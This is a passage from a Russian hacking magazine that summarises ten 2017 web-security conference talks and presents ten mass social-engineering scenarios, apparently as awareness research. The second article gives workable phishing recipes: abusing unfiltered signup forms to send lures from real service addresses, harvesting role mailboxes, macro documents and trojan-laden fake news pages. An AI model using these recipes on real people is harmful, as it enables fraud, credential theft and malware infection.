ВЫВОДЫ
Как видишь, простейший мисконфиг привел к таким серьезным проблемам.
Если ты счастливый обладатель проб лемных инстал ляций Memcached, то
скорее добавляй ключ ‐U 0 или ‐‐udp‐port=0, чтобы отключить поддержку
UDP. Или закручивай гайки при помощи фай рвола, если вдруг для каких‐то
приложений критично использование именно этого протокола.
   Чтобы не допустить или по крайней мере снизить вероятность подобных
проблем, нужно внимательно относиться к тем учас ткам кода, которые тянут‐
ся из древ них версий приложения. Хотя бы раз в год нужно проводить
ревизию старых функций на предмет логических оши бок, всевоз можных
недочетов, да и общей целесо образности. Индус трия не стоит на месте, и то,
что казалось очевидным и безопасным вчера, может стать абсолютно неп‐
риемлемым и компрометирующим сегодня.
ВЗЛОМ

 НЕ БЕЗОПАСНОСТЬ
        WEBAPP

                  10 ГОРЯЧИХ ДОКЛАДОВ
                С ИБ‐КОНФЕРЕНЦИЙ





                                                                       Антон Карев
                                                                        Эксперт по информационной
                                                                           безопасности. Образование
                                                                        высшее, специальность
                                                                       «Защита информации в
                                                                     компьютерных системах», в
                                                                     настоящий момент работает
                                                                       над диссертацией. Область
                                                                          профессиональных
                                                                        интересов — технологическая
                                                                             разведка, аналитика в сфере
                                                                           ИБ, искусственный
                                                                                        интеллект.
                                                                                 vedacoder@mail.ru





Каждый безопас ник должен держать руку на пульсе и быть
в курсе значимых публикаций и презентаций по нашему
с тобой профилю. Не всем уда ется постоянно путешество‐
вать по миру и посещать хакерские конференции (завидуем
белой завистью Денису Макрушину), но с некоторых пор
для наших подписчиков это перестало быть проблемой.
Первую часть  статьи, посвященную  актуальным ИБ‐док‐
ладам, которые стоит увидеть, мы опубликовали в начале
февраля этого года. Судя по комментам, читателям это пон‐
равилось, поэтому мы продолжаем.  :) В этом выпуске —
самые интерес ные публикации, посвященные безопасности
WebApp.


ЗОМБИ-РАСШИРЕНИЯ CHROME ЗАХВАТЫВАЮТ ИНТЕРНЕТ
Tomer Cohen. Game of Chromes: Owning the Web with Zombie Chrome Exten‐
sions // DEF CON. 2017
   16 апреля 2016 года армия ботов штурмовала серверы Wix, создавая
новые аккаунты и публикуя в мас совом порядке теневые веб‐сайты. Атака
велась вредоносным расширением бра узера Chrome, которое в результате
самораспространения было уста новлено на десятках тысяч девайсов. Этот
базирующийся  на  расширениях  бот  использовал  Wix’овую  платформу
веб‐сайтов и Facebook’овский мессенджер — для саморас пространения
среди пользователей этих интернет‐сервисов. Два месяца спус тя та же
самая атака повторилась. На этот раз зло умышленни ки инфицировали всплы‐
вающие уве домления Facebook’а — так, чтобы при клике по этому уведом‐
лению управление передавалось на вредоносный JSE‐файл, который уста‐
навливал контрабандное расширение в Chrome‐браузе ре жертвы. Затем
это контрабандное рас ширение экс плуатировало Facebook’овский мес сен‐
джер еще раз — теперь уже чтобы распростра нить себя еще большему числу
жертв.
   Анализируя эти две бот‐атаки, поражаешь ся их неуловимости, а особенно
тому, как они обходят веб‐ориентированные сис темы обнаружения ботов.
Однако это не должно удивлять, пос кольку легаль ным расширениям браузера
позволено многое: отправлять сооб щения в Facebook, соз давать веб‐сайты
в Wix, да и вообще выполнять любое действие от имени пользовате ля. С дру‐
гой стороны, контрабандные вредонос ные рас ширения в Google Web Store
и их эффективное распростра нение среди боль шого количес тва жертв,
подобно двум описанным выше ата кам, превраща ют Google Web Store в зону
боевых действий.
  Кроме того, совсем недавно было обна ружено, что несколько популярных
расширений Chrome уяз вимы для XSS. Тому самому XSS, которому под‐
вержено большинство веб‐приложений. Причем в слу чае с браузерными рас‐
ширениями последствия от XSS могут быть куда более разрушительными,
чем в случае с традиционным зло упот реблением XSS на веб‐сайтах. Яркий
тому пример — расширение Adobe Acrobat для Chrome, которое 10 янва‐
ря 2016 года было по‐тихому уста новлено компанией Adobe на 30 миллионов
компьютеров. DOM’овская XSS‐уяз вимость, найденная в этом расширении,
позволяла злоумышленнику создавать контент, запускающий JavaScript‐код
от имени этого Adobe’овского рас ширения.
  В докладе рассказывается, как подоб ные изъ яны приводят к полному
и постоянному контролю над браузером жертвы, превращая легальное рас‐
ширение в зомби. Кроме того, докладчик про ливает новый свет на две атаки,
упомянутые в начале описания доклада. Демонс трирует, как злоумышленник
может использовать аналогичные техники для эффективной дос тавки вре‐
доносной полезной нагрузки к новым жертвам, через популярные социаль‐
ные  платформы и таким обра зом соз давать  в интернете мощнейшие
бот‐сети.





АТАКА НА БРАУЗЕРНЫЕ РАСШИРЕНИЯ ПО ОБХОДНЫМ КАНАЛАМ
Iskander Sanchez‐Rola, Igor Santos, Davide Balzarotti. Extension Breakdown: Se‐
curity Analysis of Browsers Extension Resources Control Policies // Proceedings
of the 26th USENIX Security Symposium. 2017. P. 679–694
  Все наиболее востребованные браузеры поддерживают механизм рас‐
ширений. Поскольку бра узерные расширения тес но связаны с браузерным
окружением, они в пос леднее время стали привлекательным для злоумыш‐
ленников объектом. С помощью механизма расширений злоумышленни ки
уже давно собирают кон фиденциальную информа цию, прос матривают исто‐
рию поиска, воруют пароли. Все эти свои находки злоумышленники затем
используют для очень серь езных целенап равленных атак.
  В  современ ных  браузерах  теоретичес ки  есть  контрмеры,  которые
защищают расширения и их ресурсы от дос тупа к ним со стороны третьих
лиц. Однако все эти контрмеры грешат одним из двух изъянов: либо их
недостаточно, либо они реализованы некорректно.
  В  этом  док ладе  представлена  атака  на  браузерные  расширения
по обходным каналам, как раз направлен ная про тив настроек контроля дос‐
тупа. Данная атака обходит даже самые современные защитные механизмы,
во всех популярных браузерах, в том числе Chromium, Firefox, Microsoft Edge,
Safari.
   Также в докладе демонстрируют ся раз рушительные последствия от при‐
менения плохой практики прог раммирования, из‐за которой большинство
ныне существующих браузерных расширений очень уязвимы.


ЭКСПЛУАТАЦИЯ ОДНОЙ И ТОЙ ЖЕ SQLITE-УЯЗВИМОСТИ НА
РАЗНОМ СОФТЕ
Siji Feng, Zhi Zhou, Kun Yang. Many Birds One Stone: Exploiting a Single Sqlite Vul‐
nerability Across Multiple Software // Black Hat. 2017
   SQLite широко исполь зует ся в качес тве встроенной БД для локального/
клиентского  хранилища  в прикладном софте, таком  как веб‐браузеры
и мобильный софт. Как реляционная БД, SQLite уязвима для SQL‐инъ екций.
Эксплоитами SQL‐инъекций сегодня уже мало кого удивишь. Поэтому в док‐
ладе сделан акцент на ошибки повреждения памяти в SQLite. Обычно эти
ошибки не считаются серь езными проб лемами кибербезопас ности, и пред‐
полагается, что они вряд ли будут эксплуатироваться. Однако в этом докладе
описаны несколько вариантов повреждения памяти через удаленный дос туп,
чтобы показать, что такой тип атак представляет для SQLite серьезную опас‐
ность.
  Экскурс в  SQLite‐эксплоиты начинается с WebSQL. БД WebSQL —
это веб‐интерфейс для хра нения данных, дос туп к которым может быть
получен посредством SQL‐запросов. Хотя рабочая группа W3C прекратила
развивать эту спецификацию в 2010 году, многие современные браузеры (в
том числе Google Chrome, Apple Safari и Opera) все еще имеют в своей
реализации обширную функциональность на осно ве SQLite.
  В докладе рассмотрено несколько последних эта пов в эволюции SQLite,
рассказано, какое влияние эти этапы оказали на браузеры и каким исправ‐
лениям SQLite подвергалась на протяжении своей эволюции. Кроме того,
в докладе представлены новейшие SQLite‐уяз вимос ти, которые докладчик
использовал для компрометации Apple Safari. Этим новейшим уязвимостям
подвержены абсолютно все браузеры, которые поддерживают БД WebSQL,
в том числе браузерные компоненты WebView (Android) и UIWebView (iOS),
которые широко используются в мобильном софте.
   Чтобы показать, какими серь езными неприятностями может обернуться
даже одна‐единственная SQLite‐уязвимость, в докладе приведено несколько
примеров применения описываемого эксплоита против разных браузе ров
и платформ.
   У многих языков программирования, в том числе PHP, Lua и Java, есть API
для привязки к SQLite. Поэто му ошиб ки повреждения памяти в SQLite,
помимо все го прочего, оказывают раз рушительное влияние на функции
безопасности этих языков прог раммирования. В качес тве примера в докладе
продемонстрировано, как скомпрометировать PHP‐движок через его SQLite‐
расширение, чтобы обойти ограничения безопас ности, предус мотренные
в PHP.





НОВЕЙШИЕ ПРИМИТИВЫ И СТРАТЕГИИ ДЛЯ ПРОВЕДЕНИЯ CSRF-
АТАК
Joe Rozner. Wiping out CSRF // DEF CON. 2017
  CSRF  (Cross  Site  Request  Forgery, межсай товая подделка  запроса)
не теряет своей актуальнос ти и остается неуло вимой — из‐за устаревшего
кода, устаревших фреймворков, а также из‐за того, что разработчики поп‐
росту не понимают сути этой проблемы, а если и понимают, то не знают,
как от нее защититься. Докладчик в своем выступлении вводит при митивы
и стратегии для проведения CSRF‐атак, которые могут быть развернуты про‐
тив любого веб‐софта, использующего HTTP (в котором сущес твует тех‐
ническая возможность перехватывать и модифицировать HTTP‐запросы
и HTTP‐ответы).
  Современные фреймворки наконец‐то стали предлагать эффективные
решения для противодействия CSRF. Эти решения автоматичес ки интегри‐
руются в веб‐софт и хорошо показывают себя в большинс тве случаев. Одна‐
ко множество старых приложений, а также новые приложения, которые либо
не используют эти фреймворки вообще, либо используют их некорректно,
по‐прежнему подвержены CSRF.
  Докладчик подробно разбира ет, почему CSRF все еще жива, анализируя
при этом примеры «полезной нагрузки», которая эксплуатирует конкретные
проблемы в их различных вариациях. Докладчик проводит живую демонстра‐
цию этих атак и показывает, как современные умные фреймворки пытаются
защититься от них.
  Далее докладчик показывает, как синтезировать рассмотренные примити‐
вы в единое универсальное решение, способное проводить CSRF в подав‐
ляющем большинстве ситуаций. Объясняются огра ниче ния умных фреймвор‐
ков и эксплуатация этих огра ничений. Под конец своего выс тупления док‐
ладчик рассматривает Same Site Cookies — новейшую технологию против
CSRF — и объясняет, как и почему описанные методики распространяются
и на эту технологию.


ЗЛОУПОТРЕБЛЕНИЕ ВЕБ-ХУКАМИ — ДЛЯ C2 (COMMAND AND
CONTROL)
Dimitry Snezhkov. Abusing Webhooks for Command and Control // DEF CON. 2017
   Хакер проник за периметр. Разумеется, он хочет провести эксфильтра‐
цию, скачать утилиту или выполнить команду на сво ем C2‐сервере. Но вот
проблема: в каждом из этих случаев ему необходимо установить с C2‐сер‐
вером связь, а такая воз можность заб локирована. Генерируемый хакером
DNS‐трафик и ICMP‐трафик монито рятся. Доступа к облачным хранилищам
нет. Конечно, злоумышленнику удалось дос тавить внутрь периметра фрон‐
тенд‐компонент своей хакерской утилиты, но в результате он видит, что она
не может преодолеть зас лон контентно го прокси‐сервера, который контро‐
лирует доступ к внешним сайтам. Многим взломщикам доводилось бывать
в такой переделке, и выпутаться из нее помогают альтернативные способы
наладить исходящее подключение к сети. В докладе представлена техника
налаживания такой связи пос редством HTTP‐кол бэков: экс плуатация списка
«доверенных сайтов» для содействия в работе с внешним C2‐сервером
через веб‐хуки.
  Докладчик кратко рассказывает, что такое веб‐хуки и как их использовать.
Затем он объясняет, как мож но приспособить «одобренные сай ты» в качес‐
тве посредника для C2‐коммуникации, переда вать данные, отдавать асин‐
хронные команды в режиме реального времени. И все это в обход контентных
прокси, без лишних цифровых следов! Под конец докладчик демонс трирует
авторский инструмент, который авто матизирует описанные в докладе тех‐
ники.





НОВОЕ ПОКОЛЕНИЕ SSRF-АТАК: ЭКСПЛОИТЫ ДЛЯ URL-ПАРСЕРОВ
САМЫХ ВОСТРЕБОВАННЫХ ЯЗЫКОВ ПРОГРАММИРОВАНИЯ
Orange Tsai. A New Era of SSRF: Exploiting URL Parser in Trending Programming
Languages! // Black Hat. 2017
  Докладчик демонстрирует принципиально новую  технику применения
SSRF‐эксплоитов (Server Side Request Forgery, подделка запроса на стороне
сервера). Эта техника значитель но расширя ет поверхность SSRF‐атак и поз‐
воляет обходить даже самые современные SSRF‐контрме ры. Описываемая
техника представляет собой комбинированный подход, основой которого
служит автоматический поиск специфи чес ких 0day‐уязвимостей во встро‐
енных библиоте ках языков прог рамми рова ния. Автоматичес кий поиск 0day‐
уязвимостей ведется при помощи авторской ути литы для фаз зинга, которая
фокусируется на поиске только тех уяз вимос тей, которые обусловле ны несог‐
ласованностью действий URL‐парсеров и URL‐запросов. Проблема этой
несогласованности фундаментальна, и она свойственна встроенным биб‐
лиотекам всех языков прог раммирования, в том числе Python, PHP, Perl, Ruby,
Java, JavaScript, Wget и cURL.
   Таким образом, весь веб‐софт, разработанный с применением этих язы‐
ков и встроенных биб лиотек, потенциально уяз вим для нового поколения
SSRF‐атак. В том числе WordPress (на долю которого приходится 27%
интернета), vBulletin, MyBB и GitHub. Во всех этих веб‐приложениях докладчик
обнаружил 0day‐уязвимос ти, связанные с несог ласованностью действий
URL‐парсеров и URL‐зап росов. В докладе показа но на живых примерах,
как применять эксплоиты для URL‐парсеров, чтобы обходить SSRF‐защиту
и устраивать RCE (Remote Code Execution, уда ленное выполнение кода).
Разобравшись в основополага ющих моментах предлагаемой докладчиком
техники, уже не удив ляешься, что докладчик нашел больше двадцати фун‐
даментальных уязвимостей в рас пространенных языках программирования
и наиболее востребованном веб‐софте.





DOM НЕДОСТОИН ВАШЕГО ДОВЕРИЯ: ОБХОД XSS-
БЛОКИРАТОРОВ ПОСРЕДСТВОМ СКРИПТ-ГАДЖЕТОВ
Sebastian Lekies, Krzysztof Kotowicz, Eduardo Vela Nava. Don’t Trust the DOM:
Bypassing XSS Mitigations via Script Gadgets // Black Hat. 2017
  XSS (Cross‐Site Scripting, межсайтовый скриптинг) — хроническая болезнь
любого веб‐софта. На протяжении долгих лет предпри нимаются все новые
и новые попытки победить XSS. Большинс тво этих попыток сосредоточены
на контроле тегов, в которых можно запускать скрипты, и на контроле обра‐
ботчиков событий. Политика HTML-дезин фекции, к примеру, нацеле на
на удаление потенциаль но опасных тегов и атри бутов. Другая политика, CSP
(Content Security Policy, политика защиты контента), запрещает использовать
встроенные обработчики событий и огра ничивает допустимые к исполь‐
зованию скрипты белым списком.
  В этом докладе представлена новая техника взлома веб‐софта, которая
позволяет злоумышленнику обходить большинство XSS‐блокираторов. Суть
этой  техники —  в  использовании  так  называемых  скрипт‐гаджетов.
Скрипт‐гаджет — это законный фрагмент JS‐кода на веб‐странице, который
при  помощи  CSS‐селекторов  считыва ет  содержимое  DOM‐эле ментов
и затем обрабатывает их таким обра зом, чтобы запустился вредоносный
скрипт.
  Для злоупотребления скрипт‐гаджетом злоумышленник делает на стра‐
нице‐жертве JS‐инъекцию, которая выглядит как вполне законный JS‐код,
но может «ошибочно» увеличивать привилегии доступа к обрабаты ваемому
DOM‐элементу.  Впоследс твии  скрипт‐гаджет  запускает  находящиеся
под контролем злоумышленника скрипты. Поскольку первоначально имплан‐
тированный эле мент выглядит доброкачес твенным, он легко проходит мимо
XSS‐блокираторов.
  В предлагаемом докладе продемонстрировано, что скрипт‐гад жеты при‐
сутствуют практически во всех современных JS‐биб лиотеках, API и веб‐соф‐
те. В докладе представлено нес колько тематичес ких исследований и реаль‐
ные примеры из дикой природы, демонс трирующие, что подавляющее боль‐
шинство ныне существу ющих методов противо действия XSS несос тоятельны.





ELECTRONEGATIVITY: ИССЛЕДОВАНИЕ БЕЗОПАСНОСТИ ELECTRON
Luca Carettoni. Electronegativity: A Study of Electron Security // Black Hat. 2017
  Вопреки многочисленным про рочествам, старые добрые «настольные
приложения» с недавнего времени вновь обрели популярность. После нес‐
кольких лет переноса автономных приложений в интернет мы сегодня наб‐
людаем обратную тенденцию. Многие компании начали пре доставлять нас‐
тольные версии своих приложений, используя при этом те же технологии, что
и при разработке веб‐софта. Один из самых популярных фреймворков, обес‐
печивающих такую возможность, — GitHub’овский Electron, который поз воля‐
ет создавать кросс‐платформенные настольные при ложения на основе таких
технологий, как JavaScript, HTML и CSS. Хотя подоб ный шаг на первый взгляд
кажется весьма лаконичным, встраивание веб‐технологий в автономную
веб‐среду (Chromium, Node.js) порождает новые проблемы с кибербезопас‐
ностью.
  В этом докладе проиллюстрирована Electron’овская модель безопасности
и описан механизм изоляции, огражда ющий примитивы Node.js от сом‐
нительного контента. Подробно описаны внут ренние компоненты Electron’а,
в том числе обмен IPC‐сообщениями и предзагруз ка. Также представлены
результаты анализа опций безопасности для BrowserWindow и WebView, архи‐
тектурные изъяны и ошибки реализации в приложениях, пос троенных на базе
Electron’a.
  Кроме того, в рамках своего исследова ния по безопас ности Electron’а
докладчик представил карту общей поверхности атак и привел исчерпы‐
вающий контрольный список антишаблонов. Также докладчик анонсировал
свой новый инструмент (Electronegativity), предназна ченный для автоматичес‐
кого поиска уязвимостей в приложениях, разработанных на основе Electron’а.





КАК НОВОМОДНЫЕ ВЕБ-СТАНДАРТЫ И НАГРОМОЖДЕНИЕ
СПЕЦИФИКАЦИЙ ПРИВОДЯТ К ВОЗНИКНОВЕНИЮ КРИТИЧЕСКИХ
ОШИБОК В СКРИПТОВЫХ ДВИЖКАХ
Natalie Silvanovich. The Origin of Array: How Standards Drive Bugs in Script En‐
gines // Black Hat. 2017
   Веб‐стандарты постоянно эволюционируют и постоянно диктуют новые
требования к тому, что придерживающиеся этих стандартов браузе ры могут
делать. Однако новые воз можнос ти, описываемые этими стандартами, также
приводят и к новым проблемам с безопас ностью, новым уязвимостям.
Потому что для реализации этих возможностей уже существующая функци‐
ональность используется новым, незап ланированным способом.
  Докладчик обсуждает некоторые из наиболее интересных и необычных
особенностей JavaScript, с появлением которых в JS‐движке также появились
и новые критические уязвимос ти, которым подвержены самые раз нооб‐
разные скриптовые движки, в том числе Adobe Flash, Chrome, Microsoft Edge
и Safari.
  В докладе доходчиво объясняется, как новомодные веб‐стандарты и наг‐
ромождение спе цификаций друг на дру га (как это происходит в современных
скриптовых движках) приводят к воз никновению неустранимых кри тических
ошибок. При этом в док ладе акцент сделан не на перечислении конкретных
ошибок, а на объяснении того, почему эти ошиб ки неизбежно возникают.
  Докладчик объясняет, что нагромож дение спецификаций (для реализации
обновленной  функциональнос ти),  как  правило,  негативно  сказывается
на безопасности кода скриптового движка. Но соблазн воспользоваться
более новой и более удобной функци ей — даже несмотря на то, что новая
версия скриптового движка, в которой эта функция реализована, более уяз‐
вима, — берет верх над здра вым смыслом.
  Последствия нагромож дения спецификаций про иллюстрированы реали‐
зацией массива (который на сегодняшний день представляет собой смесь
фильтров, умной индекса ции, смешанных типов, подклассов, многопоточного
доступа и других концепций). Докладчик объясняет, что негативные последс‐
твия для безопасности воз ника ют в том числе из‐за того, что реализация
массивов в одном браузере, как правило, несовместима с его реализацией
в другом браузере. Почему так про исходит? Иногда из‐за того, что разработ‐
чики скриптовых движков не до конца поняли отраслевой стандарт, регули‐
рующий работу скриптового движка; иногда из‐за того, что какие‐то пункты
этого стандарта сформулированы неоднозначно… И так не только с мас‐
сивами, но и со всеми остальными компонентами скриптовых движков.


WCD-АТАКА: ФАЛЬСИФИКАЦИЯ ВЕБ-КЕША
Omer Gil. Web Cache Deception Attack // Black Hat. 2017
  WCD‐атака (Web Cache Deception; фальсификация веб‐кеша) — это новый
вектор веб‐атак, который ста вит под угрозу широкое разнообразие самых
современных веб‐технологий и фреймворков. Манипулируя поведе нием
веб‐серверов и механизмами кеширования веб‐контента, анонимные зло‐
умышленники могут скомпрометировать конфиденциальную информацию
авторизованных пользователей веб‐софта, а в некоторых случаях даже могут
захватить полный контроль над их учетными запися ми.
  WCD‐атака на удивление прос та в исполнении. В докладе представлено
ее подробное описание, необходимые для ее проведения предпосылки и то,
каким обра зом безопасники пыта ются от нее защищаться. Презентация
WCD‐атаки сопровождается демонс тра цией поведения различных веб‐сер‐
веров и механизмов веб‐кеширования. Доклад завершается примерами уяз‐
вимых для WCD‐атаки сайтов и демонс тра ционной атакой.


ЗАКЛЮЧЕНИЕ
На этом наш обзор закончен. Зна ешь другие интересные презентации?
Кидай ссылки в комменты! Мы всегда рады обратной связи от читателей.
Которые, кстати, иногда потом ста новят ся нашими писателями. :)
ВЗЛОМ





                                  Юрий Другач
                                           Автор блога о социальной
                                               инженерии



   ОРУЖИЕ
  МАССОВОГО
 ЗАБЛУЖДЕНИЯ
   РАЗБИРАЕМ 10 ПРОСТЫХ РЕЦЕПТОВ
      СОЦИАЛЬНОЙ ИНЖЕНЕРИИ



Социальная инженерия обычно считается частью таргетиро‐
ванной атаки, но что, если применять подоб ные схемы мас‐
сово? Я разработал и протестировал десять таких сценари‐
ев, чтобы понять, как люди будут на них реагировать и какие
могут быть последствия.


Я часто слышу, что среди всех видов атак на орга низации социальная инже‐
нерия считается якобы самым раз рушительным и опасным. Но почему же тог‐
да на каждой конференции по информационной безопасности этому вопросу
не отводится отдельный блок?
  При этом большинство кейсов в русско говорящем сегменте интернета
приводится из иностранных источников и историй Кевина Митника. Я
не утверждаю, что в Рунете таких случаев мало, просто о них почему‐то
не говорят. Я решил разобрать ся в том, нас коль ко в реальности опас на соци‐
альная инженерия, и прикинуть, какими могут быть последствия ее массового
применения.
  Социальная инженерия  в ИБ и пентестин ге обычно ассоциируется
с точечной атакой на кон кретную орга низа цию. В этой подборке кей сов я хочу
рассмотреть несколь ко способов применения соци альной инженерии, когда
«атаки» производились массово (без раз бора) или мас сово‐таргетированно
(по организациям определен ной сферы).
  Давай определимся с понятиями, чтобы было ясно, что я имею в виду. Я
буду использовать термин «социальная инженерия» в сле дующем значении:
«совокупность методов достижения цели, основанная на использовании сла‐
бостей человека». Не всегда это что‐то кри миналь ное, но это определенно
имеет негативный окрас и ассоциирует ся с обма ном, мошенничеством,
манипулированием и тому подобными вещами. А вот всякие психологические
штучки по выбиванию скидки в магазине — это не социальная инженерия.
  Сразу скажу, в данной сфере я выступал лишь как исследователь, никаких
вредоносных сайтов и файлов я не создавал. Если кому‐то приходило письмо
от меня со ссылкой на сайт, то этот сайт был безопа сен. Самое страшное, что
там могло быть, — это отслеживание пользователя счетчиком «Яндекс.Мет‐
рики».
  Наверняка  ты  слышал  про  спам  с  «актами  выполненных  работ»
или договорами, в которые вшиты трояны. Такой рас сылкой бухгалтеров уже
не удивишь. Или всплывающие окна с «рекомендациями» скачать плагин
для просмотра видео — это уже скучно. Я разработал несколько менее оче‐
видных сценариев и представляю их здесь в качес тве пищи для размышле‐
ний. Наде юсь, что они не ста нут руководством к действию, а, наоборот,
помогут сделать Рунет безопаснее.


1. «ВЕРИФИЦИРОВАННЫЙ ОТПРАВИТЕЛЬ»
Иногда администраторы сайтов по недос мотру не включают фильтрацию
поля «Имя» в форме регистра ции (ска жем, при подписке на рассылку или при
отправке какой‐нибудь заявки). Вмес то имени можно вставить текст (иногда
килобайты текста) и ссылку на вредоносный сайт. В поле email вставляем
адрес жертвы. После регистрации это му человеку придет письмо от сервиса:
«Здравствуйте, уважаемый…», а дальше — наш текст и ссылка. Сообщение
от сервиса будет в самом низу.
   Как это прев ратить в оружие массового поражения? Элементарно. Вот
один случай из моей практики. В одном из поисковиков в декабре 2017 года
была обнаруже на возможность отправки сооб щений через форму привязки
запасного email. До того как я выслал отчет по программе bug bounty, име‐
лась возможность отправлять 150 тысяч сообщений в сутки — нужно было
только немного автоматизировать заполнение формы.
   Этот трюк позволя ет отправлять мошенничес кие письма с настоящего
адреса техподдержки сайта, со всеми цифровыми подписями, шиф рованием
и так далее. Вот только вся верхняя часть ока зывается написанной злоумыш‐
ленником. Такие письма приходили и мне, причем не только от крупных ком‐
паний вроде booking.com или paypal.com, но и от менее име нитых сайтов.





В моем тесте по ссылке переш ло око ло 10% получателей. Комментарии
излишни.
  А вот «тренд» апреля 2018‐го.


Пись ма с Google Analytics
Расскажу о совсем новом случае — за апрель 2018 года. С почты Google Ana‐
lytics noreply‐analytics@google.com на нес коль ко моих адресов начал при‐
ходить спам. Немного разобравшись, я нашел способ, которым его отправ‐
ляют.





«Как это применить?» — подумал я. И вот что пришло на ум: мошенник может
сделать, например, такой текст.





При переходе по ссылке пользователь попадал бы на поддельный сайт
и оставлял бы свой пароль.





Такой сбор паролей можно провести не только адресно, но и массово, нужно
лишь немного автоматизировать процесс сбора доменов с Google Analytics
и парсинга email с этих сайтов.



2. «ЛЮБОПЫТСТВО»
Этот метод заставить человека перейти по ссылке тре бует некоторой под‐
готовки. Создается сайт фейковой компании с уни кальным названием,
которое сразу привлекает внимание. Ну, например, ООО «ЗагибалиВы гиба‐
ли». Ждем, пока поисковики его проиндексируют.





Теперь придумываем какой‐нибудь повод разос лать поз дравления от имени
этой компании. Получатели тут же начнут его гуглить и найдут наш сайт.
Конечно, лучше и само поз дравление сделать необычным, чтобы получатели
не смахнули письмо в пап ку со спамом. Про ведя небольшой тест, я легко
заработал более тысячи переходов.


3. «ФЕЙКОВАЯ ПОДПИСКА НА РАССЫЛКУ»
Вот совсем уж простой способ зас тавить человека перейти на сайт по ссылке
в письме. Пишем текст: «Спасибо, что подписались на нашу рас сылку! Ежед‐
невно вы будете получать прайс‐лист железобетонной продукции. С уважени‐
ем, ...». Дальше добавляем ссылку «Отписаться от рассылки», которая будет
вести на наш сайт. Конечно, никто на эту рассылку не подписывался, но ты
удивишься, узнав число спешно отписывающихся.


4. «МАЙНИНГ ИМЕЙЛОВ»
Чтобы составить свою базу, необязательно даже писать собс твенный кра‐
улер и обходить сайты в поисках пло хо лежащих адресов. Достаточно списка
всех русскоязычных доменов, которых сейчас нас читывается около пяти мил‐
лионов. Добавляем к ним info@, проверяем получившиеся адреса и в итоге
имеем где‐то 500 тысяч рабочих почт. Точно так же можно приписывать direc‐
tor,  dir, admin, buhgalter, bg, hr и так далее. Под каждый из этих отде лов
готовим письмо, рассылаем и получа ем от сотен до тысяч ответов от сот‐
рудников определенной сферы деятельнос ти.


5. «А ЧТО ЭТО ТАМ НАПИСАНО?»
Чтобы заманить пользователей с какого‐нибудь форума или сайта с откры‐
тыми комментариями, не нужно выдумывать заманчивые тексты — достаточно
всего лишь запостить картинку. Просто выбери что‐нибудь попривлекатель‐
нее (какой‐нибудь мем) и ужми так, чтобы различить текст было невозможно.
Любопытство неизменно заставляет пользователей кликать по картинке. Я
провел эксперимент и получил таким способом около 10 тысяч переходов.
А еще я знаю случай, когда ребята адаптировали этот метод для дос тавки
троянов через ЖЖ.





6. «КАК ВАС ЗОВУТ?»
Заставить пользователя открыть файл или даже документ с макросом не так
сложно, даже несмотря на то, что многие слышали о подстерегающих опас‐
ностях. При массовой рас сылке даже просто зна ние име ни челове ка серь‐
езно повышает шансы на успех.
  Например, мы можем отпра вить письмо с текстом «Этот email еще акти‐
вен?»  или  «Напишите,  пожалуйста,  адрес  вашего  сайта». В  отве те
как минимум в 10–20% случаев придет имя отправителя (чаще это встречает‐
ся в крупных компаниях). А через какое‐то время пишем «Алё на, здравствуй‐
те. Что такое с вашим сайтом (фото приложил)?» Или «Борис, добрый день.
Никак не разберусь с прайсом. Мне 24‐я позиция нужна. Прайс прик‐
ладываю». Ну а в прайсе — банальная фра за «Для прос мотра содержимого
вклю чите макросы...», со всеми вытека ющими пос ледствиями.
  В общем, персонально адресованные сооб щения откры ваются и обра‐
батываются на порядок чаще.


7. «МАССОВАЯ РАЗВЕДКА»
Этот сценарий — не столько атака, сколько подготовка к ней. Предположим,
мы хотим узнать имя какого‐то из важных сотрудников — например, бухгалте‐
ра или руководителя службы безопасности. Это нес ложно сде лать, если
отправить кому‐то из сот рудников, которые могут обладать этой информа‐
цией, письмо сле дующего содержания: «Подскажите, пожалуйста, отчество
директора и график работы офиса. Нуж но отправить курьера».
  Время работы спрашиваем, чтобы замылить глаза, а спрашивать отчес‐
тво — это трюк, который поз воляет не выдавать, что мы не знаем имени
и фамилии. И то и другое, скорее всего, будет содержаться в ответе жертвы:
ФИО чаще всего пишут целиком. Мне в ходе исследования удалось таким
образом собрать ФИО более чем двух тысяч директоров.
   Если нужно узнать почту начальства, то можно смело писать секретарю:
«Здравствуйте. Давно не общался с Андреем Борисовичем, его адрес an‐
drey.b@company.ru еще рабочий? А то ответ не получил от него. Роман Ген‐
надьевич». Секретарь видит email, выдуманный на основе настоящих ФИО
директора и содер жащий сайт компании, и дает настоящий адрес Андрея
Борисовича.


8. «ПЕРСОНАЛИЗИРОВАННОЕ ЗЛО»
Если нужно заставить отреагировать на письмо большое количество орга‐
низаций, то первым делом надо искать болевые точки. Например, магази нам
можно направлять жалобу на товар и грозить разбирательствами: «Если вы
не решите мою проб лему, буду жаловаться директору! Это что вы мне такое
доставили (фото прилагаю)?! Пароль от архива 123». По базе автосервисов
точно так же можно рассылать фотографию с поломкой и вопросом, смогут
ли отремонтировать. По стро ителям — «проект дома». В моем небольшом
исследовании на такие пись ма откликались как минимум 10% получателей.


9. «САЙТ НЕ РАБОТАЕТ»
Базу сайтов с почтовыми адресами владельцев легко превратить в переходы
на любой другой сайт. Отправляем пись ма с текстом «Почему‐то страница
вашего сайта www.site.ru/random.html не работа ет!». Ну и классический при‐
ем: в тексте ссылки жертва видит свой сайт, а сама ссылка ведет на другой
URL.


10. «МУЛЬТИЛЕНДИНГ»
К этому способу нужно будет подготовиться. Соз даем сайт‐одностраничник,
оформляем под новостной ресурс. Ставим скрипт, который меняет текст
на сайте в зависимости от того, по какой ссылке человек перешел.
  Делаем рассылку по базе, сос тоящей из адресов и наз ваний компаний.
В каждом письме — уникальная ссылка на наш новостной ресурс, например
news.ru/?1234. Параметр 1234 привязывается к опре деленному названию
компании. Скрипт на сайте определяет, по какой ссылке пришел посетитель,
и показывает в тексте название компании, соот ветс твующее почте из базы.
  Зайдя на сайт, сотрудник увидит заголовок «Компания ... (название ком‐
пании  жертвы)  снова  бесчинствует».  Далее  идет  короткая  новость
с какими‐нибудь небылицами, а в ней — ссылка на архив с разоблачитель‐
ными материалами (трояном).


ВЫВОДЫ
Понятно,  что  в  атаках  на  крупные  организации  массовая  рассылка
не поможет, — там нужен индивиду альный подход. А вот малый бизнес, где
слыхом не слыхивали ни про какую социальную инженерию, легко может пос‐
традать от таких атак.
ВЗЛОМ

ПРОСЛУШКА
VOIP





           КАК PRISM И BULLRUN
        ИЗВЛЕКАЮТ ИНФОРМАЦИЮ
        ИЗ ГОЛОСОВОГО ПОТОКА





